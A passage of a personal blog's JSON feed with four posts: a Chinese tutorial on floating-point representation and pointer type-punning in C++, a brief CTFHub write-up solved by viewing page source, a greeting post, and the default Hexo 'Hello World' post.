style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">x</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.1141079999999999em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.864108em;\"><span style=\"top:-3.1130000000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">e</span><span class=\"mord mathnormal mtight\">x</span><span class=\"mord mathnormal mtight\">p</span><span class=\"mbin mtight\">−</span><span class=\"mord mtight\">1</span><span class=\"mord mtight\">2</span><span class=\"mord mtight\">7</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mopen\">(</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≥</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8304100000000001em;vertical-align:-0.19444em;\"></span><span class=\"mord mathnormal\">e</span><span class=\"mord mathnormal\">x</span><span class=\"mord mathnormal\">p</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">≥</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\">0</span><span class=\"mclose\">)</span></span></span></span></span></p>\n<p>例如，对于 7.0，我们可以表示为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mn>7.0</mn><mo>×</mo><msup><mn>2</mn><mn>0</mn></msup><mspace linebreak=\"newline\"></mspace><mn>3.5</mn><mo>×</mo><msup><mn>2</mn><mn>1</mn></msup><mspace linebreak=\"newline\"></mspace><mn>1.75</mn><mo>×</mo><msup><mn>2</mn><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">7.0×2^0\\\\\n3.5 ×2^1\\\\\n1.75×2^2\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">7</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">3</span><span class=\"mord\">.</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span><span class=\"mspace newline\"></span><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">7</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8641079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8641079999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>总归是可以表示到如上的标准形式。</p>\n<h5 id=\"4整数与浮点数之间的赋值\"><a class=\"markdownIt-Anchor\" href=\"#4整数与浮点数之间的赋值\">#</a> 4.\t整数与浮点数之间的赋值</h5>\n<p>如果有以下程序：</p>\n<pre><code class=\"language-c++\">int i = 5;\nfloat f = i;\ncout &lt;&lt; f &lt;&lt; endl;\n----------\n    \n</code></pre>\n<p>这其中变化是这样的：</p>\n<p><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>5</mn></mrow><annotation encoding=\"application/x-tex\">5</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.64444em;vertical-align:0em;\"></span><span class=\"mord\">5</span></span></span></span> 被解释为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>5.0</mn><mo>×</mo><msup><mn>2</mn><mn>0</mn></msup></mrow><annotation encoding=\"application/x-tex\">5.0×2^0</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">5</span><span class=\"mord\">.</span><span class=\"mord\">0</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">0</span></span></span></span></span></span></span></span></span></span></span> 随后又被解释为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>2.5</mn><mo>×</mo><msup><mn>2</mn><mn>1</mn></msup></mrow><annotation encoding=\"application/x-tex\">2.5×2^1</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">2</span><span class=\"mord\">.</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">1</span></span></span></span></span></span></span></span></span></span></span> 接着又被解释为 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mn>1.25</mn><mo>×</mo><msup><mn>2</mn><mn>2</mn></msup></mrow><annotation encoding=\"application/x-tex\">1.25×2^2</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.72777em;vertical-align:-0.08333em;\"></span><span class=\"mord\">1</span><span class=\"mord\">.</span><span class=\"mord\">2</span><span class=\"mord\">5</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">×</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8141079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\">2</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8141079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\">2</span></span></span></span></span></span></span></span></span></span></span>. 因此 exp = 129，xxx=0.25。</p>\n<p>如果有以下程序：</p>\n<pre><code class=\"language-c++\">int i = 37;\nfloat f = *(float*)&amp;i; // 对i的地址求值\n</code></pre>\n<p>&amp;i 表示 i 的地址，i 是 int 类型的数，因而 &amp;i 是 int * 类型的指针。</p>\n<p>(float*)&amp;i 表示将 int * 类型 转变为了 float * 类型，bit 位置不会发生改变，而因为 37 对应的 bit 位 都落在了 xxxxxx 的位置上，因而 exp = 0，这就是一个奇小无比的数，而不是 37.0</p>\n<p>如果有以下程序：</p>\n<pre><code class=\"language-c++\">float f = 7.0;\nshort s = *(short *)&amp;f;\n</code></pre>\n<p>float 是 4 字节的数，指针指向 float 的最高位。当利用上述代码进行类型强制转换的时候，因为 short 只有 2 字节，因而 float 只有高位的两字节被直接复制过来，定义成了一个 short 类型的数。如下图所示：</p>\n<p><img data-src=\"image-20230921091608188.png\" alt=\"image-20230921091608188\"></p>\n",
            "tags": []
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/",
            "url": "http://yanagi-kon.github.io/2023/09/19/WEB%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81/",
            "title": "WEB响应包源代码",
            "date_published": "2023-09-19T04:24:13.000Z",
            "content_html": "<h1 id=\"ctfhub-响应包源代码\"><a class=\"markdownIt-Anchor\" href=\"#ctfhub-响应包源代码\">#</a> CTFHub | 响应包源代码</h1>\n<p>题目网页显示的内容如下：</p>\n<p><img data-src=\"test2.png\" alt=\"test2\"></p>\n<p>打开源代码就可以找到答案：</p>\n<p><img data-src=\"test1.png\" alt=\"test1\"></p>\n",
            "tags": []
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/",
            "url": "http://yanagi-kon.github.io/2023/09/18/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/",
            "title": "我的第一篇博客",
            "date_published": "2023-09-18T13:04:24.472Z",
            "content_html": "<p>你好！</p>\n<p>Hello！</p>\n<p>Hallo！</p>\n<p>こんにちわ‼</p>\n",
            "tags": []
        },
        {
            "id": "http://yanagi-kon.github.io/2023/09/18/hello-world/",
            "url": "http://yanagi-kon.github.io/2023/09/18/hello-world/",
            "title": "Hello World",
            "date_published": "2023-09-18T12:22:51.258Z",
            "content_html": "<p>Welcome to <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvLw==\">Hexo</span>! This is your very first post. Check <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mv\">documentation</span> for more info. If you get any problems when using Hexo, you can find the answer in <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvdHJvdWJsZXNob290aW5nLmh0bWw=\">troubleshooting</span> or you can ask me on <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hleG9qcy9oZXhvL2lzc3Vlcw==\">GitHub</span>.</p>\n<h2 id=\"quick-start\"><a class=\"markdownIt-Anchor\" href=\"#quick-start\">#</a> Quick Start</h2>\n<h3 id=\"create-a-new-post\"><a class=\"markdownIt-Anchor\" href=\"#create-a-new-post\">#</a> Create a new post</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo new <span class=\"token string\">\"My New Post\"</span></pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvd3JpdGluZy5odG1s\">Writing</span></p>\n<h3 id=\"run-server\"><a class=\"markdownIt-Anchor\" href=\"#run-server\">#</a> Run server</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo server</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvc2VydmVyLmh0bWw=\">Server</span></p>\n<h3 id=\"generate-static-files\"><a class=\"markdownIt-Anchor\" href=\"#generate-static-files\">#</a> Generate static files</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo generate</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3MvZ2VuZXJhdGluZy5odG1s\">Generating</span></p>\n<h3 id=\"deploy-to-remote-sites\"><a class=\"markdownIt-Anchor\" href=\"#deploy-to-remote-sites\">#</a> Deploy to remote sites</h3>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"><span>h</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>$ hexo deploy</pre></td></tr></table></figure><p>More info: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9oZXhvLmlvL2RvY3Mvb25lLWNvbW1hbmQtZGVwbG95bWVudC5odG1s\">Deployment</span></p>\n",
            "tags": []
        }
    ]
}